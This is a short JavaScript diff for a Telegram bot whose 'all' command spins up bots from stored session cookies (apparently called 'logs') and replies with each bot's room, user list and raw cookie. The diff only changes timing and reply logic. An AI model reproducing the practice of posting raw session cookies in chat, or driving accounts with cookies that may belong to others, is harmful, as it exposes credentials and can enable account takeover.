@@ -113,15 +113,12 @@ TG.command("all", (ctx) => {
                 bot[2] = new Bot();
                 bot[2].cookie = logs[x].cookie;
                 bot[2].getLoc(() => {
-                    up = () => {
-                        try {tex += ("\n\nКомната: `" + bot[2].room.name + "`\nПользователи: `" + bot[2].users.map(u => u.name).join(', ') + "`\nКуки: `" + bot[2].cookie + "`");}
-                        catch { up(); }
-                    }
-                    up();
+                    setTimeout(() => {
+                        ctx.reply("Комната: `" + bot[2].room.name + "`\nПользователи: `" + bot[2].users.map(u => u.name).join(', ') + "`\nКуки: `" + bot[2].cookie + "`", { parse_mode: "Markdown" });
+                        delete bot[2];
+                    }, 1000);
                 });
-                delete bot[2];
             });
-            ctx.reply(tex, { parse_mode: "Markdown" });
         } else ctx.reply('Ботов нет.', { parse_mode: "Markdown" });
     });
 });
